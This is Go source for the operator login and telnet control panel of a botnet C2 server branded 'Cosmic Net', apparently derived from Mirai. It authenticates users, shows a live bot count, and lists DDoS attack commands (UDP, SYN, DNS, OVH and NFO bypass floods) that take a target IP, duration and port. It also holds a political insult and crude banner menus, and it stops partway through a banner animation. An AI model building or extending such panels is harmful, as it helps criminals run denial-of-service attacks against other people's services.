package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	// Get username
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))   
    this.conn.Write([]byte("\033[37m\r\n"))                                                                                        
    this.conn.Write([]byte("\033[37m                                ╔═╗╔═╗╔═╗╔╦╗╦╔═╗     \r\n"))
    this.conn.Write([]byte("\033[37m                                ║  ║ ║╚═╗║║║║║       \r\n"))
    this.conn.Write([]byte("\033[37m                                ╚═╝╚═╝╚═╝╩ ╩╩╚═╝     \r\n"))                                                  
    this.conn.Write([]byte("\033[37m\r\n"))  
    this.conn.Write([]byte("\033[37m\r\n"))                                                                                                                                                   
    this.conn.Write([]byte("\033[93m                        ║Username ════\033[37m➢ \x1b[37m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\033[93m                        ║Password ════\033[37m➢ \x1b[37m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}
	//Attempt  Login
	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 15; i++ {
		this.conn.Write(append([]byte("\r\033[01;36m\033[01;36mWait \033[01;37m"), spinBuf[i%len(spinBuf)]))
		time.Sleep(time.Duration(300) * time.Millisecond)
	}
	this.conn.Write([]byte("\r\n"))

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
		this.conn.Write([]byte("\033[2J\033[1;1H"))
		this.conn.Write([]byte("\r\033[91m[!] Invalid login!\r\n"))
		this.conn.Write([]byte("\033[91mPress any key to exit\033[0m"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	this.conn.Write([]byte("\r\n\033[0m"))
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; Cosmic Net > Bots: [%d] | User: [%s] | Methods:[9] | Bypass:[2]\007", BotCount, username))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\033[1;34mLoading Cosmic! Welcome \033[1;37m" + username + "\033[1;34m!\r\n"))
    time.Sleep(1000 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))                  
    this.conn.Write([]byte("\033[1;34m \033[1;34m  All Methods  > \033[1;32mONLINE                  \033[1;34m║\r\n"))                                                           
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))                
    this.conn.Write([]byte("\033[1;34m \033[1;34m  All Methods  > \033[1;32mONLINE                  \033[1;34m║\r\n"))  
    this.conn.Write([]byte("\033[1;34m \033[1;34m  All Commands > \033[1;32mONLINE                  \033[1;34m║\r\n"))                                               
    time.Sleep(500 * time.Millisecond)
    this.conn.Write([]byte("\033[2J\033[1H"))                
    this.conn.Write([]byte("\033[1;34m \033[1;34m  All Methods  > \033[1;32mONLINE                  \033[1;34m║\r\n"))  
    this.conn.Write([]byte("\033[1;34m \033[1;34m  All Commands > \033[1;32mONLINE                  \033[1;34m║\r\n"))
    this.conn.Write([]byte("\033[1;34m \033[1;34m  All Bots     > \033[1;32mONLINE                  \033[1;34m║\r\n"))                                                         
    time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[1;34mCosmic NET For Education\r\n"))
        this.conn.Write([]byte("\033\r\n"))
        this.conn.Write([]byte("\033\r\n"))

	for {
		var botCatagory string
		var botCount int
        this.conn.Write([]byte("\x1b[38;2;0;212;14m╔══[" + username +"\x1b[38;2;0;186;45m@C\x1b[38;2;0;150;88mo\x1b[38;2;0;113;133ms\x1b[38;2;0;113;133mm\x1b[38;2;0;113;133mi\x1b[38;2;0;113;133mc\x1b[38;2;0;49;147m]\r\n"))
        this.conn.Write([]byte("\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m"))
		cmd, err := this.ReadLine(false)

		if err != nil || cmd == "exit" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}

		if cmd == "clear" || cmd == "cls" || cmd == "c" {
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[1;34mZelensky is a clown\r\n"))
    	this.conn.Write([]byte("\033\r\n"))
        this.conn.Write([]byte("\033\r\n"))
		continue
		}

		if cmd == "help" || cmd == "HELP" || cmd == "?" { // display help menu
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[01;37m  \033[1;37m METHODS\033[0m \r\n"))
			this.conn.Write([]byte("\033[01;37m  \033[1;37m BANNERS : \033[1;37mALL BANNERS    \033[01;37m   \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;37m  \033[1;37m BOTS : \033[1;37mNUMBER BOTS    \033[01;37m      \033[0m \r\n"))
			this.conn.Write([]byte("\033[01;37m  \033[1;37m CLEAR : \033[1;35m    \033[01;37m    \033[0m \r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "METHODS" || cmd == "methods" { // display methods and how to send an attack
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[1;35mUsage: ![METHOD] [IP] [TIME] dport[PORT]               \r\n"))
			this.conn.Write([]byte("\x1b[1;32m .udp [IP] [TIME] dport=[PORT]        \x1b[1;35m\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m .cosmic [IP] [TIME] dport=[PORT]     \x1b[1;35m\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m .std [IP] [TIME] dport=[PORT]        \x1b[1;32m\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[1;32m .xmas [IP] [TIME] dport=[PORT]       \x1b[1;32m\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;32m .ovh [IP] [TIME] dport=[PORT]        \x1b[1;32m\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;32m .udphex [IP] [TIME] dport=[PORT]     \x1b[1;32m\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;32m .dns [IP] [TIME] dport=[PORT]        \x1b[1;32m\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;32m .syn [IP] [TIME] dport=[PORT]        \x1b[1;32m\x1b[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;32m .nfo [IP] [TIME] dport=[PORT]        \x1b[1;32m\x1b[0m\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if userInfo.admin == 1 && cmd == "admin" {
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[01;37m \033[1;34madduser -> \033[1;35mAdd normal user  \033[01;37m\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		if cmd == "credits" || cmd == "CREDITS" {
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[01;37mWho is the owner do you know?\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}

        if err != nil || cmd == "banners" || cmd == "BANNERS" {
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[32m\r\n"))
			this.conn.Write([]byte("\033[01;37m BANG : BIGBANG\033[0m \r\n"))
			this.conn.Write([]byte("\033[01;37m PIKACHU : PIKA PIKA\033[0m \r\n"))
			this.conn.Write([]byte("\033[01;37m TROLL : TROLL MEME\033[0m \r\n"))
			this.conn.Write([]byte("\033[01;37m SAITAMA : SAITAMA SUPER\033[0m \r\n"))
			this.conn.Write([]byte("\033[01;37m UWU : ANIME GIRL UWU\033[0m \r\n"))
			this.conn.Write([]byte("\033[01;37m LOLI : ANIME LOLI\033[0m \r\n"))
			this.conn.Write([]byte("\033[01;37m HENTAI : KIMOCHI UU\033[0m \r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }

        if err != nil || cmd == "troll" || cmd == "TROLL" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[37m  \033[38mHEHE \033[37m" + username + "\033[38m GOT TROLLED!!!        \r\n")))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   █░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  \r\n"))
            this.conn.Write([]byte("\033[37m   █░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  \r\n"))
            this.conn.Write([]byte("\033[37m   ░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[38m       FROM VIETNAM WITH LOVE <3 \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }

        if cmd == "BANG" || cmd == "bang" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
    
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                           
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[37m          | == /       \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  /        \r\n"))
            this.conn.Write([]byte("\033[37m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[37m          | == /       \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  /        \r\n"))
            this.conn.Write([]byte("\033[37m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[37m          | == /       \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  /        \r\n"))
            this.conn.Write([]byte("\033[37m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m           |/**/|       \r\n"))
            this.conn.Write([]byte("\033[37m           / == /       \r\n"))
            this.conn.Write([]byte("\033[37m            |  |        \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                                        this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[99m     _.-^^---....,,--             \r\n"))
            this.conn.Write([]byte("\033[38m _--                  --_         \r\n"))
            this.conn.Write([]byte("\033[38m<                        >)        \r\n"))
            this.conn.Write([]byte("\033[38m|                         |        \r\n"))
            this.conn.Write([]byte("\033[38m /._                   _./         \r\n"))
            this.conn.Write([]byte("\033[97m    ```--. . , ; .--'''            \r\n"))
            this.conn.Write([]byte("\033[38m          | |   |                  \r\n"))
            this.conn.Write([]byte("\033[38m       .-=||  | |=-.               \r\n"))
            this.conn.Write([]byte("\033[97m       `-=#$%&%$#=-'               \r\n"))
            this.conn.Write([]byte("\033[38m          | ;  :|    BOOMMMM.\r\n"))
            this.conn.Write([]byte("\033[37m _____.,-#%&$@%#&#~,._____         \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(1000 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mWhat is that noice?\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mI love you..\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
